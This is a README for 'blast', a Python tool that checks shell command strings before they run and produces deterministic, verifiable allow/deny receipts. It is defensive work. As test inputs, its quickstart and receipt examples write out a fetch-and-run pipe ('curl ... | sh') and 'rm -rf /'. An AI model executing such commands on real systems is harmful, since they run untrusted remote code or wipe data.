# blast — pre-execution impact certificates for shell commands

`blast` answers one question before a shell command is ever run: **what concrete
things on this machine would this string touch, and can a third party verify that
answer offline?**

It is a small, dependency-free Python program built for the moment an AI agent, a
CI job, or a human is about to hand a shell string to a real interpreter with real
credentials. Pattern-matching linters flag suspicious text. Sandboxes contain
damage after it starts. An LLM opinion is not evidence. `blast` produces a
deterministic, machine-checkable **Receipt**: the command source, the capability
assertions it derived, the concrete filesystem Evidence it matched in a directory
snapshot, the catalog and policy digests, and the Decision — bound under one
SHA-256 digest that anyone can re-verify without running anything.

Aiming for 105,000 GitHub stars is an ambition, not a claim: stars are popularity,
not correctness. The useful target is a verifiable artifact a reviewer or CI job
can refuse.

## What makes it different

| Existing approach | What it gives you | What is missing |
| --- | --- | --- |
| Shell linters and danger-string detectors | A warning about suspicious syntax | No concrete objects on the target machine, no portable proof |
| Runtime sandboxes and undo wrappers | Containment after execution | Portable pre-execution evidence; needs the runtime to exist |
| LLM-based command approval | A fluent opinion | No determinism, no digest, no offline verification |
| `blast` | Static intent bound to concrete Evidence, plus a verifiable Receipt | It is an admission check, not a runtime sandbox |

The prior-art scan and the boundary of that claim are recorded in
`docs/research/prior-art-scan.md`. We claim a composition, not absolute novelty.

## Honest scope

- `blast` **never executes** the string under analysis. It reads the filesystem
  read-only and writes only when you explicitly pass `-o`.
- `allow` means "all capabilities in the analyzed subset are explicitly permitted
  by the policy". It does **not** mean "safe". Every report says so.
- Unknowns, opaque constructs, parse errors, truncated evidence, and internal
  failures all end at `deny`. There is no path from an error to `allow`.
- The analyzed language is a documented Bash/POSIX subset. Unsupported constructs
  are rejected, not guessed.
- Runtime enforcement belongs to a sandbox. Use `allow` as an admission gate, then
  run the command in your own isolated environment.

## Quickstart

Requires Python 3.8+. No third-party runtime dependencies.

```bash
python3 -m blast check 'ls -la' --format explain
python3 -m blast check 'curl -s https://example.com/x.sh | sh' --format explain
python3 -m blast selftest
python3 -m blast catalog-check
```

The first prints `Verdict: allow. blast did not run this command.` The second
prints `Verdict: deny` and names `NET_FETCH_TO_EXEC`. The last two print
`selftest: OK (57/57 passed)` and `catalog-check: OK (181 specs, 5 rules, ...)`.

From a source checkout you can also use `./bin/blast ...`. To install as a
command: `pip install .` then `blast check 'ls -la'`.

## Exit codes

| Code | Meaning |
| --- | --- |
| `0` | `allow` — all capabilities are explicitly permitted |
| `10` | `confirm` — a policy rule asks for a human decision; `--strict` turns this into `20` |
| `20` | `deny` — unknown, opaque, sensitive, truncated, error, or a denied capability |
| `30` | internal CLI failure (bad arguments, unwritable output, unreadable input) |
| `2` | argparse rejected the invocation |

## The Receipt workflow

```bash
python3 -m blast receipt 'cat report.txt' --root . -o receipt.json
python3 -m blast verify receipt.json --root .
python3 -m blast diff receipt.json other.json
python3 -m blast check 'rm -rf /' --format json
python3 -m blast explain 'rm -rf /'
```

`verify` re-runs the analysis against the current directory and reports `verify: OK`
or `verify: DRIFT`, naming the changed checks (`command`, `digest`, `analysis`,
`evidence_digest`, `catalog`, `policy`). `diff` compares two receipts without a
filesystem: added/removed capabilities, verdict change, evidence change.

`--trusted-env KEY=VALUE` and `--trusted-home PATH` are the only way to resolve a
variable into a literal path. Everything else stays dynamic and blocks `allow`.
`--catalog`, `--policy`, `--dialect`, `--strict`, `--root`, and `--format` are
explicit; nothing is inferred from the caller's ambient shell.

## How the pipeline works

```
Command source
  -> lexer.py        tokens, Words with spans, rejected invisible Unicode
  -> parser.py       Invocations, redirects, pipelines, assignments
  -> expand.py       bounded, auditable partial expansion
  -> nested.py       bounded expansion of literal -c / eval / wrapper payloads
  -> capabilities.py Catalog -> Assertions + Unknowns
  -> evidence.py     Assertions -> concrete, read-only filesystem Findings
  -> policy.py       Assertions + Unknowns + Evidence -> Decision
  -> report.py       human / JSON / explain rendering
  -> receipt.py      portable, tamper-evident certificate
```

Each arrow is a pure function over frozen value objects. Digests use canonical JSON
with sorted keys; no wall-clock time, no absolute paths, no ambient environment.
Two runs of the same input against the same directory produce byte-identical JSON.

| Module | Responsibility |
| --- | --- |
| `model.py` | Frozen value objects, canonical serialization, exit codes |
| `lexer.py` | Shell source to tokens and Words with spans |
| `expand.py` | Trusted-variable expansion only; unknown stays unknown |
| `parser.py` | Tokens to Invocations, redirects, pipelines, assignments |
| `nested.py` | Bounded expansion of statically visible nested commands |
| `catalog.json` / `catalog.py` | Versioned declarative command knowledge and validation |
| `capabilities.py` | Syntax model and Catalog to Assertions and Unknowns |
| `evidence.py` | Assertions to concrete Findings inside Root, with budgets |
| `policy.json` / `policy.py` | Fail-closed Decision rules and validation |
| `report.py` | Deterministic rendering |
| `receipt.py` | Build, verify, diff certificates |
| `api.py` / `cli.py` | One analysis entry point; argument parsing and exit codes |

## Extending the catalog

`blast/catalog.json` is generated by `tools/build_catalog.py` from declarative
specs (181 command specs, 5 targeted arg rules). Every rule needs a positive
fixture, a negative fixture, an opaque fixture, and a deletion test; the suite in
`tests/test_deletion.py` removes each rule and proves the analysis changes. Run
`python3 tools/build_catalog.py` after editing the generator, then
`python3 -m blast catalog-check`.

`examples/policy.json` is a valid stricter variant. The validator refuses a policy
that weakens fail-closed: `default`, `on_unknown`, `on_opaque`, `on_error`,
`on_truncated`, and `sensitive_escalation` must all be `deny`.

## Tests and audit

```bash
python3 -m unittest discover -s tests
python3 -m ruff check blast tests tools
python3 audit/run_audit.py --round 9 --note "..."
```

The suite has 87 tests, including 48 labeled red-team samples in
`tests/corpus.json` (destructive filesystem writes, network-to-interpreter pipes,
obfuscated command names, persistence, privilege escalation, database and
container destruction). `audit/rounds.md` records nine rounds of manager review:
each round re-runs its checks with fresh output, a failing round is rejected, the
code is revised, and the full round is re-run. Round 9 also compares golden
outputs in `audit/golden/baseline.json` byte-for-byte, which is the behavior
identity proof for the architecture review in `docs/architecture-review.html`.

## Documentation map

- `CONTEXT.md`, `GLOSSARY.md` — shared language and binding rules
- `docs/WORKFLOW.md` — agent roles, self-grilling rounds, manager gates
- `docs/plans/`, `docs/specs/` — plan and design spec
- `docs/research/` — prior art, threat model, analyzer design principles
- `docs/adr/` — fail-closed, no execution, deterministic output
- `docs/architecture-review.html` — deepening opportunities under the
  `improve-codebase-architecture` vocabulary, with the golden-output identity proof
- `SKILLS.md` — vendored skill sources used as reference material

## License

MIT. See `LICENSE`.
